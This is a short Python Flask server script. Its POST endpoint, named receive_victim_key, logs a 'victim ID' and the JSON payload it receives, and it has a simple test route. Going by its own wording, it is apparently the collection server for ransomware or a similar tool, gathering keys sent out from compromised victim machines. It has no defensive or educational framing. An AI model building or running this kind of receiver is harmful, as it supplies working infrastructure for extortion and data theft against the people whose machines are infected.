# install flask pip install flask before running the server

from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/api/keys', methods=['POST'])
def receive_victim_key():
    data = request.json
    
    print("Got a key from victim")
    print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
    print(f"JSON payload: {json.dumps(data)}\n")
    
    return jsonify({"status": "success"}), 200

# test endpoint
@app.route('/test', methods=['GET'])
def test():
    return jsonify({
        "status": "OK",
        "message": "server working"
    }), 200

if __name__ == '__main__':
    print("Server is running on port 8000")
    app.run(host='0.0.0.0', port=8000)

